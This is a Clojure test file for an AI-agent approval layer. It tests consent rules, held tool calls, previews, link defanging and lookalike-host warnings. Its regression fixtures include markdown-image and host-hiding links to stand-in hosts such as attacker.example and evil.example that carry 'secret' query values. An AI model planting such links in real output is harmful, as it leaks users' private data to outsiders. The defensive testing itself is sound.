(ns relay.consent-test
  "Effect classes, standing consent and previews: what relay.edn may say,
  what reaches agentloop's policy, and what the operator is shown about a
  held call."
  (:require [babashka.fs :as fs]
            [cheshire.core :as json]
            [clojure.string :as str]
            [clojure.test :refer [deftest is testing]]
            [clojure.test.check :as tc]
            [clojure.test.check.clojure-test :refer [defspec]]
            [clojure.test.check.generators :as gen]
            [clojure.test.check.properties :as prop]
            [relay.acp :as acp]
            [relay.config :as config]
            [relay.core :as core]
            [relay.test-support :as support]
            [relay.dispatch :as dispatch]
            [relay.render :as render]
            [relay.text :as text]
            [relay.harness.agentloop :as harness-agentloop]
            [relay.inbound]
            [relay.tools :as tools]
            [relay.workspace])
  (:import (java.time Instant)))

(def t0 (Instant/parse "2026-10-14T12:00:00Z"))

(def send-tool
  {:class :act :labels ["private"] :protocol :envelope :description "Send a campaign."
   :parameters {:type "object" :properties {:group {:type "string"}}}
   :command ["true"]
   :consent [{"group" "Kira only"}]})

(def settings {:timezone "UTC"
               :default-harness :agentloop
               :harnesses {:agentloop {:kind :agentloop :api-key-command ["true"] :bin "/nonexistent/agentloop"}}
               :notify {:kind :none}
               :tools {"send" send-tool
                       "rem" {:class :edit :labels ["private"] :description "Reminders." :command ["true"]}}
               :grants {"hub" {:may-add true} "clerk" {:tools ["send" "rem"]}}})

(def cfg (config/resolve-config settings))

(defn- refusal [tool]
  (try (config/resolve-config (assoc-in settings [:tools "send"] tool)) nil
       (catch clojure.lang.ExceptionInfo e (ex-message e))))

;; --- settings

(deftest relay-edn-takes-edit-consent-and-preview
  (is (= :edit (get-in cfg [:tools "rem" :class])))
  (is (nil? (refusal (assoc send-tool :preview ["preview-cmd" "--x"]))))
  (testing "consent belongs to act tools alone"
    (is (str/includes? (refusal (assoc send-tool :class :egress)) "only an :act tool"))
    (is (str/includes? (refusal (assoc send-tool :class :edit)) "only an :act tool")))
  (testing "consent beside always-hold is refused: always-hold would win"
    (is (str/includes? (refusal (assoc send-tool :always-hold true)) ":always-hold")))
  (testing "a rule is a non-empty map from string names to JSON values"
    (doseq [bad [[{}] {"group" "x"} [{:group "x"}] [{"group" :x}] [{"n" 1/3}] [{"n" ##NaN}] ["x"]]]
      (is (refusal (assoc send-tool :consent bad)) (pr-str bad)))
    (is (nil? (refusal (assoc send-tool :consent [{"group" "a" "n" 1 "ok" true "x" nil "l" [1 "b"] "m" {"k" 2.5}}])))))
  (testing "a preview is a command"
    (doseq [bad [[] "cmd" [""] [:x] ["a\u0000b"]]]
      (is (refusal (assoc send-tool :preview bad)) (pr-str bad))))
  (testing "an MCP tool may have both"
    (is (contains? config/mcp-tool-keys :consent))
    (is (contains? config/mcp-tool-keys :preview))))

(deftest relay-s-own-registry-and-routine-tools-are-write
  (let [offered (tools/offered cfg "hub")]
    (doseq [t ["routine_write" "routine_remove" "role_add" "role_update" "role_remove" "dead_letters_retry"]]
      (is (= :write (get-in offered [t :class])) t))
    (is (not-any? #(= :act (:class %)) (vals offered)) "relay's own tools are never act")))

(deftest the-policy-carries-the-operator-s-consent
  (let [manifest (tools/manifest cfg "clerk")
        policy (tools/policy manifest ["private"])]
    (is (= {:class "act" :labels ["private"] :consent [{"group" "Kira only"}]} (get-in policy [:tools "send"])))
    (is (= {:class "edit" :labels ["private"]} (get-in policy [:tools "rem"])))
    (is (= "{\"class\":\"act\",\"labels\":[\"private\"],\"consent\":[{\"group\":\"Kira only\"}]}"
           (json/generate-string (get-in policy [:tools "send"])))
        "as JSON, the rule names the argument as written")
    (is (= "edit" (get (acp/tool-kinds manifest) "rem")))))

;; --- holds and previews

(defn- run [{:keys [state now] :as w} actor type args & [labels]]
  (let [[state' events] (core/run-command state {:type type :actor actor :args args :labels labels}
                                          {:now now :config cfg})]
    (assoc w :state state' :last events)))

(def preview
  {:content "Send to **Everyone**, 412 people. Unsubscribe: https://lists.service.example/u/1"
   :is-error false :labels ["private"]})

(defn- held-world [held]
  (let [w (-> {:state core/empty-state :now t0}
              (run "operator" :role/add {:id "hub" :title "Hub" :instructions "Run relay."})
              (run "operator" :role/add {:id "clerk" :title "Clerk" :instructions "File things."})
              (run "operator" :memo/send {:to "clerk" :subject "Send it" :body "Please."})
              (run "dispatcher" :wake/start {:role "clerk" :dispatched true}))
        wake (support/calling-wake (:state w) "clerk")]
    (run w "dispatcher" :wake/end {:wake (:id wake) :outcome "ran" :exit 0 :session "sess-1" :said "Waiting."
                                   :labels ["contaminated" "private"] :held held})))

(deftest a-preview-is-kept-with-its-hold-under-its-own-labels
  (let [w (held-world [{:id "c1" :name "send" :input {:group "Everyone"} :input-sha256 "d1" :preview preview}
                       {:id "c2" :name "send" :input {:group "x"} :input-sha256 "d2"}
                       {:id "c3" :name "send" :input {:group "y"} :input-sha256 "d3"
                        :preview {:content 7 :is-error false :labels []}}])
        [h1 h2 h3] (core/open-holds (:state w) "clerk")
        previewed (filter #(= "hold/previewed" (:type %)) (:last w))]
    (is (= (:content preview) (get-in h1 [:preview :content])))
    (is (= ["contaminated" "private"] (get-in h1 [:preview :labels]))
        "what it reported, the tool's labels and the session's")
    (is (= ["contaminated" "private"] (:labels h1)) "the hold's own labels are the session's")
    (is (nil? (:preview h2)))
    (is (nil? (:preview h3)) "a preview relay cannot keep is dropped")
    (is (= 1 (count previewed)))))

(deftest the-operator-sees-the-preview-with-new-hosts-marked
  (let [w (held-world [{:id "c1" :name "send" :input {:group "Everyone"} :input-sha256 "d1" :preview preview}])
        h (first (core/open-holds (:state w)))
        shown (str/join "\n" (render/hold h cfg (core/approved-hosts (:state w))))]
    (is (str/includes? shown "held because others would see it"))
    (is (str/includes? shown "from the tool's preview, not from the role"))
    (is (str/includes? shown "412 people"))
    (is (str/includes? shown "[contaminated]") "the preview carries the session's labels, so it is marked")
    (is (str/includes? shown "links to places you have not approved before:\n      lists[.]service[.]example"))
    (testing "once the operator approves a call whose preview had the host, it is no longer new"
      (let [w (run w "operator" :hold/resolve {:hold (:id h) :verdict "allow"})
            approved (core/approved-hosts (:state w))]
        (is (= #{"lists.service.example"} approved))
        (is (not (str/includes? (str/join "\n" (render/hold h cfg approved)) "not approved before")))))
    (testing "a denied hold approves nothing"
      (is (empty? (core/approved-hosts (:state (run w "operator" :hold/resolve {:hold (:id h) :verdict "deny"}))))))))

(deftest an-edit-hold-says-why
  (let [h {:id 1 :role "clerk" :tool "rem" :session "s" :call "c" :input {:args ["add" "x"]}
           :labels ["contaminated" "private"]}]
    (is (str/includes? (str/join "\n" (render/hold h cfg)) "it changes your things outside relay, and the session has seen an outsider's text"))
    (is (core/quarantines? cfg "clerk") "an edit tool quarantines contaminated memos, as act and egress do")))

(deftest a-failed-preview-says-so
  (let [lines (render/preview {:content "relay could not get a preview: the preview command exited 3."
                               :is-error true :labels []} #{})]
    (is (str/includes? (first lines) "could not say"))))

;; --- running the preview command

(defn- script! [dir body]
  (let [f (fs/path dir "preview.sh")]
    (spit (str f) (str "#!/bin/sh\n" body "\n"))
    (fs/set-posix-file-permissions f "rwx------")
    (str f)))

(deftest the-preview-command-gets-the-held-call-and-its-answer-is-kept
  (let [dir (fs/create-temp-dir)]
    (try
      (let [log (str (fs/path dir "in.json"))
            cmd (script! dir (str "cat > " log "\nprintf '{\"content\":\"Send to 412\",\"labels\":[\"private\"]}'"))
            p (tools/run-preview! "send" [cmd] {:group "Everyone"} ["private"] "c1")]
        (is (= {:content "Send to 412" :is-error false :labels ["private"]} p))
        (is (= {"input" {"group" "Everyone"} "labels" ["private"] "call_id" "c1"} (json/parse-string (slurp log)))))
      (doseq [[body why] [["exit 3" "exited 3"] ["echo not json" "exactly one result envelope"]
                          ["printf '{\"content\":\"a\",\"labels\":[\"secret\"]}'" "exactly one result envelope"]]]
        (let [p (binding [*err* (java.io.StringWriter.)]
                  (tools/run-preview! "send" [(script! dir body)] {} [] "c1"))]
          (is (:is-error p) body)
          (is (str/includes? (:content p) why) body)))
      (let [p (binding [*err* (java.io.StringWriter.)] (tools/run-preview! "send" ["/nonexistent/preview"] {} [] "c1"))]
        (is (str/includes? (:content p) "could not start")))
      (finally (fs/delete-tree dir)))))

(deftest previews-run-only-for-new-holds-of-tools-that-have-one
  (let [dir (fs/create-temp-dir)]
    (try
      (let [count-file (str (fs/path dir "runs"))
            cmd (script! dir (str "echo x >> " count-file "\nprintf '{\"content\":\"ok\",\"labels\":[]}'"))
            config (assoc-in cfg [:tools "send" :preview] [cmd])
            state (:state (held-world [{:id "old" :name "send" :input {} :input-sha256 "d"}]))
            report {:session "sess-1" :labels ["private"]
                    :held [{:id "old" :name "send" :input {}} {:id "new" :name "send" :input {}}
                           {:id "r" :name "rem" :input {}}]}
            out (dispatch/with-previews {:config config} state report)]
        (is (= [nil {:content "ok" :is-error false :labels []} nil] (map :preview (:held out))))
        (is (= 1 (count (str/split-lines (slurp count-file)))) "the known hold is not previewed again"))
      (finally (fs/delete-tree dir)))))

;; --- the ACP permission request

(def request-line
  (json/generate-string {:jsonrpc "2.0" :id 7 :method "session/request_permission"
                         :params {:sessionId "s" :options [{:optionId "allow_once" :kind "allow_once" :name "Allow"}]
                                  :toolCall {:toolCallId "c1" :name "send" :rawInput {:group "Everyone"}
                                             :content [{:type "content" :content {:type "text" :text "model's"}}]
                                             :_meta {"agentloop/labels" ["private"]}}}}))

(deftest the-permission-request-carries-the-preview-marked
  (let [md (acp/preview-markdown preview #{})
        out (json/parse-string (acp/with-preview request-line md ["private"]))
        before (json/parse-string request-line)
        items (get-in out ["params" "toolCall" "content"])]
    (is (str/includes? md "Links to places you have not approved before: lists.service.example"))
    (is (= (butlast items) (get-in before ["params" "toolCall" "content"])) "what agentloop sent is kept, first")
    (is (= {"type" "content" "_meta" {"relay/preview" true "relay/labels" ["private"]}
            "content" {"type" "text" "text" md "_meta" {"relay/preview" true "relay/labels" ["private"]}}}
           (last items)))
    (is (= (update-in before ["params" "toolCall"] dissoc "content")
           (update-in out ["params" "toolCall"] dissoc "content"))
        "nothing else in the request changes")
    (is (= (:id (acp/permission-request request-line)) (:id (acp/permission-request (acp/with-preview request-line md ["private"])))))
    (is (nil? (acp/with-preview "{\"method\":\"session/update\"}" md [])))
    (testing "a request with no content gets the preview as its only item"
      (let [bare (json/generate-string (update-in (json/parse-string request-line) ["params" "toolCall"] dissoc "content"))]
        (is (= 1 (count (get-in (json/parse-string (acp/with-preview bare md [])) ["params" "toolCall" "content"]))))))))

(deftest the-preview-markdown-is-inert
  ;; Regression (Codex review): the preview went to the client as live
  ;; markdown, so an outsider's image link in a campaign body was fetched
  ;; before approval, and an escaped @ or a character reference hid a
  ;; link's host from the check.
  (let [content (str "[receipt](https://safe.example\\@evil.example/x)\n"
                     "![i](https&#58;//img.example/?secret=1)\n&#x202e; ```` end")
        md (acp/preview-markdown {:content content :is-error false} #{"safe.example"})
        [opening & _] (str/split-lines md)]
    (is (= "`````text" opening) "a fence longer than any backtick run in the preview")
    (is (str/includes? md (str "`````text\n" content "\n`````")))
    (is (str/includes? md "not approved before: evil.example, img.example"))
    (is (not (str/includes? md ": safe.example")) "an approved host is not listed")
    (testing "the notes, which quote the preview, are fenced too"
      ;; Regression (Codex review, round 2): a lookalike note quoted an
      ;; image link outside the fence.
      (let [md (acp/preview-markdown {:content "![pаypal](https://attacker.example/pixel?secret=1)" :is-error false} #{})
            fences (filter #(re-matches #"`{3,}(text)?" %) (str/split-lines md))]
        (is (= 4 (count fences)) md)
        (is (str/ends-with? md "`") "nothing after the last fence")
        (is (every? (fn [line] (or (re-matches #"`{3,}(text)?" line) (#{"---" ""} line)
                                   (some #(str/includes? line %) ["![pаypal]" "Links to" "Characters" "U+"])))
                    (str/split-lines md)))))))

(deftest the-preview-markdown-hides-nothing
  (let [md (acp/preview-markdown {:content "Send to all​ https://pаypal.example/x" :is-error true} #{"other.example"})]
    (is (str/starts-with? md "The preview command could not say"))
    (is (str/includes? md "all\\u{200b}"))
    (is (not (str/includes? md "​")))
    (is (str/includes? md "approved before: pаypal.example"))
    (is (str/includes? md "mixes Cyrillic and Latin"))))

;; --- links

(def gen-host
  (gen/fmap (fn [parts] (str/join "." parts))
            (gen/vector (gen/not-empty (gen/fmap str/join (gen/vector (gen/elements "abcxyz019-") 1 8))) 2 3)))

(defspec link-hosts-finds-every-link-s-host 200
  (prop/for-all [hosts (gen/vector gen-host 0 4)
                 schemes (gen/vector (gen/elements ["http" "https" "HTTPS" "ftp"]) 4)
                 noise (gen/elements ["" "see " "(" "[x]("])]
    (let [s (str/join " " (map-indexed (fn [i h] (str noise (nth schemes i) "://user@" (str/upper-case h) ":8080/p?q#f)")) hosts))]
      (= (vec (distinct hosts)) (text/link-hosts s)))))

(deftest link-hosts-reads-links-as-a-renderer-would
  (is (= ["safe.example" "evil.example"] (text/link-hosts "[a](https://safe.example\\@evil.example/)")))
  (is (= ["evil.example"] (text/link-hosts "https&#58;//evil.example/ https&#x3A;//evil.example https&colon;//evil.example"))))

(deftest link-hosts-folds-what-a-browser-folds-and-nothing-else
  (is (= ["example.com"] (text/link-hosts "https://example．com/ https://EXAMPLE.com.")))
  (is (= ["exаmple.com"] (text/link-hosts "https://exаmple.com")) "a lookalike stays itself")
  (is (= [] (text/link-hosts "example.com mailto:a@b.example javascript:x"))))

(deftest the-proxy-adds-the-preview-to-the-request-the-client-sees
  (doseq [approvals [true false]]
    (let [request (json/generate-string {:jsonrpc "2.0" :id 7 :method "session/request_permission"
                                         :params {:sessionId "s" :toolCall {:toolCallId "t" :name "send" :rawInput {:group "Everyone"}}
                                                  :options [{:optionId "yes" :kind "allow_once"}
                                                            {:optionId "no" :kind "reject_once"}]}})
          seen (atom [])
          asked-for (atom [])
          client-out (java.io.PipedOutputStream.)
          client-in (java.io.PipedInputStream. client-out)
          out (java.io.ByteArrayOutputStream.)
          run (future (dispatch/proxy! {:argv ["sh" "-c" (str "echo '" request "'; read line")]}
                                       {:in client-in :out out :approvals approvals
                                        :preview (fn [req] (swap! asked-for conj (:input req))
                                                   (assoc preview :markdown "PREVIEW-MD"))
                                        :on-permission (fn [& args] (swap! seen conj args))}))
          _ (loop [n 0] (when (and (< n 200) (empty? @seen)) (Thread/sleep 10) (recur (inc n))))
          _ (Thread/sleep 100)
          _ (.close client-out)
          _ (deref run 10000 nil)
          sent (str out)]
      (if approvals
        (let [msg (json/parse-string (first (str/split-lines sent)))]
          (is (= [{"group" "Everyone"}] @asked-for))
          (is (= "PREVIEW-MD" (get-in msg ["params" "toolCall" "content" 0 "content" "text"])) sent)
          (is (= preview (:preview-record (second (first @seen))))
              "the preview is recorded with the request")
          (is (= "PREVIEW-MD" (:preview (second (first @seen))))
              "and the request is read from the line the client gets, so the pane lists the preview"))
        (do (is (empty? @asked-for) "a request the client never sees is not previewed")
            (is (not (str/includes? sent "request_permission"))))))))

;; --- a preview's labels reach the approval UI (Codex cross-cutting review)

(def contaminated-preview
  {:content "Send to all. Details: https://evil.example/x?d=1" :is-error false :labels ["contaminated"]})

(deftest a-clean-preview-is-defanged-in-relay-holds
  ;; Regression: a preview is the service's text, but relay holds left its
  ;; links live when its labels were clean.
  (let [shown (str/join "\n" (render/preview {:content "Open https://lists.service.example/u/1" :is-error false
                                              :labels ["private"]} #{}))]
    (is (str/includes? shown "hxxps://lists[.]service[.]example/u/1"))
    (is (not (str/includes? shown "https://")))
    (is (not (str/includes? shown "[contaminated]")) "a clean preview is not marked contaminated")
    (is (not (str/includes? shown "[[.]]")) "defanged once")))

(deftest the-proxy-gives-the-client-the-preview-s-own-labels
  ;; Regression: a clean, private session's act call whose preview read
  ;; contaminated text reached the client with only the session's labels,
  ;; so acp-tui and the pane left the preview's links live.
  (let [request (json/generate-string {:jsonrpc "2.0" :id 7 :method "session/request_permission"
                                       :params {:sessionId "s" :toolCall {:toolCallId "t" :name "send" :rawInput {:group "Everyone"}
                                                                          :_meta {"agentloop/labels" ["private"]}}
                                                :options [{:optionId "yes" :kind "allow_once"}]}})
        previewer (#'dispatch/permission-previewer {:config (assoc-in cfg [:tools "send" :preview] ["p"]) :clock (constantly t0)
                                                    :state (atom nil)})
        p (with-redefs [tools/run-preview! (fn [& _] contaminated-preview)
                        relay.inbound/current-state (fn [_] core/empty-state)]
            (previewer (acp/permission-request request)))
        line (acp/with-preview request (:markdown p) (:display-labels p))
        msg (json/parse-string line)
        req (acp/permission-request line)]
    (is (= ["contaminated" "private"] (:display-labels p)) "the preview's, the tool's and the session's")
    (is (= ["private"] (get-in msg ["params" "toolCall" "_meta" "agentloop/labels"]))
        "the session's labels are not changed: the session saw nothing")
    (is (= ["contaminated" "private"] (:preview-labels req)))
    (testing "the pane's proposal is labelled with the preview's labels too"
      (let [conv (relay.workspace/asked relay.workspace/conversation (assoc req :session "s" :call "t") t0)
            item (first (get (relay.workspace/items core/empty-state conv nil true) "items"))]
        (is (= ["contaminated" "private"] (get item "labels")))))))

(defspec proposal-labels-cover-the-session-and-the-preview 100
  (prop/for-all [session (gen/vector (gen/elements ["private" "contaminated"]))
                 shown (gen/vector (gen/elements ["private" "contaminated"]))]
    (let [line (acp/with-preview request-line "md" (core/union shown session))
          req (assoc (acp/permission-request line) :labels session)
          labels (set (:labels (get-in (relay.workspace/asked relay.workspace/conversation req t0)
                                       [:proposals [(:session req) (:call req)]])))]
      (and (every? labels session) (every? labels shown)
           (= (core/union shown session) (:preview-labels req))))))

;; --- fixed arguments are part of what is approved (Codex cross-cutting review)

(def fixed-held
  {:id "c1" :name "send" :input {:subject "Hi"} :input-sha256 "eff"
   :effective-input {:group "Kira only" :subject "Hi"} :fixed-args {:group "Kira only"}})

(deftest a-held-call-shows-the-input-it-would-run-on
  (let [w (held-world [fixed-held])
        h (first (core/open-holds (:state w)))
        config (assoc-in cfg [:tools "send" :fixed-args] {"group" "Kira only"})
        shown (str/join "\n" (render/hold h config #{}))]
    (is (= {:group "Kira only"} (:fixed-args h)))
    (is (str/includes? shown "\"group\" : \"Kira only\"") shown)
    (is (str/includes? shown "set by your settings, not by the role:\n      group = \"Kira only\""))
    (is (not (str/includes? shown "changed since it was held")))))

(deftest a-hold-whose-fixed-args-changed-cannot-be-allowed
  (let [w (held-world [fixed-held])
        h (first (core/open-holds (:state w)))
        changed (assoc-in cfg [:tools "send" :fixed-args] {"group" "Public list"})
        same (assoc-in cfg [:tools "send" :fixed-args] {"group" "Kira only"})
        resolve (fn [config verdict]
                  (core/run-command (:state w) {:type :hold/resolve :actor "operator" :args {:hold (:id h) :verdict verdict}}
                                    {:now t0 :config config}))]
    (is (str/includes? (str/join "\n" (render/hold h changed #{})) "changed since it was held"))
    (is (thrown-with-msg? clojure.lang.ExceptionInfo #"your settings for send changed since it was held"
                          (resolve changed "allow")))
    (is (thrown? clojure.lang.ExceptionInfo (resolve cfg "allow")) "fixed arguments removed is a change too")
    (is (seq (second (resolve changed "deny"))) "it can still be denied")
    (is (seq (second (resolve same "allow"))))))

(deftest the-preview-is-given-the-input-the-call-would-run-on
  (let [seen (atom nil)
        config (assoc-in cfg [:tools "send" :preview] ["p"])
        out (with-redefs [tools/run-preview! (fn [_ _ input & _] (reset! seen input) preview)]
              (dispatch/with-previews {:config config} core/empty-state {:session "s" :labels [] :held [fixed-held]}))]
    (is (= {:group "Kira only" :subject "Hi"} @seen))
    (is (= preview (:preview (first (:held out)))))))

(deftest relay-reads-the-effective-input-of-a-held-call
  (is (= [fixed-held]
         (harness-agentloop/held-calls [{:id "c1" :name "send" :input {:subject "Hi"} :input_sha256 "eff"
                                         :effective_input {:group "Kira only" :subject "Hi"}
                                         :fixed_args {:group "Kira only"}}])))
  (is (= [{:id "c1" :name "send" :input {} :input-sha256 "d"}]
         (harness-agentloop/held-calls [{:id "c1" :name "send" :input {} :input_sha256 "d" :fixed_args {}}]))
      "nothing fixed, nothing kept"))

(defspec a-rendered-preview-has-no-live-link 100
  ;; Regression (Codex review): the lookalike note quoted a preview's link
  ;; whole, so relay holds showed it live.
  (prop/for-all [labels (gen/elements [[] ["private"] ["contaminated"] ["contaminated" "private"]])
                 host (gen/elements ["evil.example" "p\u0430ypal.example" "lists.service.example"])
                 word (gen/elements ["" " p\u0430ypal" " \u041aira"])]
    (let [content (str "Send." word " https://" host "/receipt?token=t&name=p\u0430ypal")
          shown (str/join "\n" (render/preview {:content content :is-error false :labels labels} #{}))]
      (not (re-find #"https?://" shown)))))

(deftest a-hold-through-the-reader-is-bound-to-the-inner-tool-s-fixed-args
  ;; Regression (Codex review): relay looked up the reader's own fixed
  ;; arguments, which it never has, not the inner tool's.
  (let [h {:tool core/reader-tool :input {:tool "send" :input {:subject "Hi"}}
           :fixed-args {:group "Kira only"}}]
    (is (core/fixed-args-changed? (assoc-in cfg [:tools "send" :fixed-args] {"group" "Public list"}) h))
    (is (not (core/fixed-args-changed? (assoc-in cfg [:tools "send" :fixed-args] {"group" "Kira only"}) h)))))

(deftest placeholders-are-single-bracketed-phrases-and-nothing-else
  (is (= ["[Photographer]" "[Date of the concert]"]
         (text/placeholders "Photo: [Photographer]. On [Date of the concert], see [[fact:1]], [the site](https://x.example) and [x]. [Photographer]")))
  (is (= [] (text/placeholders "No gaps here [[doc:a/b.md@2]] - [ ] [x]"))))

(def placeholders-found-wherever-they-sit
  (prop/for-all [before gen/string-alphanumeric
                 word (gen/fmap #(str "Ph" (subs % 0 (min 60 (count %)))) gen/string-alphanumeric)
                 after gen/string-alphanumeric]
    (let [p (str "[" word "]")]
      (and (= [p] (text/placeholders (str before " " p " " after)))
           (empty? (text/placeholders (str before " [" p "] " after)))))))

(deftest a-placeholder-is-found-wherever-it-sits-and-a-ref-never-is
  (let [r (tc/quick-check 300 placeholders-found-wherever-they-sit)]
    (is (:pass? r) (pr-str (select-keys r [:seed :shrunk])))))

(deftest a-preview-marks-what-is-still-to-fill-in
  (let [content "Subject: Harbour Sound, Nov 14\n\nPhoto: [Photographer]."
        lines (str/join "\n" (render/preview {:content content :is-error false :labels ["private"]} #{}))
        md (acp/preview-markdown {:content content :is-error false} #{})]
    (is (str/includes? lines "still to fill in, and would go out as written:"))
    (is (str/includes? lines "      [Photographer]"))
    (is (str/includes? md "Still to fill in, and would go out as written: [Photographer]"))
    (is (not (str/includes? (str/join "\n" (render/preview {:content "All filled in." :is-error false} #{}))
                            "still to fill in")))))

;; --- a held input's links (cross-cutting review, round 2)

(defspec a-rendered-hold-has-no-live-link 100
  ;; Regression: relay holds and relay approve showed a held call's input,
  ;; its destinations and its lookalike notes with live links.
  (prop/for-all [labels (gen/elements [[] ["private"] ["contaminated" "private"]])
                 host (gen/elements ["attacker.example" "pаypal.example"])
                 k (gen/elements [:url :body :to])]
    (let [h {:id 9 :role "clerk" :tool "send" :session "s" :call "c" :labels labels
             :input {k (str "https://" host "/?secret=private-token")}}
          shown (str/join "\n" (render/hold h cfg #{}))]
      (and (not (re-find #"https?://" shown))
           (not (str/includes? shown host))
           (str/includes? shown "links are defanged")
           (= (boolean (some #{"contaminated"} labels)) (str/includes? shown "[contaminated]"))))))

(deftest a-hold-is-marked-by-its-preview-s-labels
  (let [h {:id 9 :role "clerk" :tool "send" :session "s" :call "c" :labels ["private"]
           :input {:group "Everyone"} :preview (assoc contaminated-preview :labels ["contaminated" "private"])}
        shown (render/hold h cfg #{})]
    (is (some #{"  [contaminated]"} shown) "a contaminated preview marks the input too")))

;; --- a preview through the reader (cross-cutting review, round 2)

(def reader-held
  {:id "c9" :name core/reader-tool :input-sha256 "eff"
   :input {:tool "send" :input {:subject "Hi"} :question "q" :schema {}}
   :effective-input {:tool "send" :input {:group "Kira only" :subject "Hi"} :question "q" :schema {}}
   :fixed-args {:group "Kira only"}})

(deftest a-call-through-the-reader-gets-its-inner-tool-s-preview
  ;; Regression: relay looked :preview up by read_quarantined, so wrapping
  ;; a tool in the reader dropped its preview.
  (let [seen (atom nil)
        config (-> cfg (assoc-in [:tools "send" :preview] ["p"]) (assoc-in [:tools "send" :labels] ["contaminated" "private"]))
        out (with-redefs [tools/run-preview! (fn [tool _ input & _] (reset! seen [tool input]) preview)]
              (dispatch/with-previews {:config config} core/empty-state {:session "s" :labels [] :held [reader-held]}))]
    (is (= ["send" {:group "Kira only" :subject "Hi"}] @seen) "the inner tool, on its effective input")
    (is (= preview (:preview (first (:held out)))))
    (testing "the ACP path does the same, with the inner tool's labels"
      (let [p (with-redefs [tools/run-preview! (fn [tool _ input & _] (reset! seen [tool input]) preview)
                            relay.inbound/current-state (fn [_] core/empty-state)]
                ((#'dispatch/permission-previewer {:config config})
                 {:tool core/reader-tool :input (:effective-input reader-held) :labels ["private"] :call "c9"}))]
        (is (= ["send" {:group "Kira only" :subject "Hi"}] @seen))
        (is (= ["contaminated" "private"] (:display-labels p)))))
    (testing "the hold keeps the preview under the inner tool's labels"
      (let [w (run (held-world []) "operator" :memo/send {:to "clerk" :subject "Again" :body "Please."})
            wake-start (core/run-command (:state w) {:type :wake/start :actor "dispatcher" :args {:role "clerk" :dispatched true}}
                                         {:now t0 :config config})
            wake (support/calling-wake (first wake-start) "clerk")
            [st] (core/run-command (first wake-start)
                                   {:type :wake/end :actor "dispatcher"
                                    :args {:wake (:id wake) :outcome "ran" :exit 0 :session "sess-9" :said "Waiting."
                                           :labels ["private"] :held [(assoc reader-held :preview preview)]}}
                                   {:now t0 :config config})
            h (first (filter #(= "c9" (:call %)) (vals (:holds st))))]
        (is (= ["contaminated" "private"] (get-in h [:preview :labels])))))))
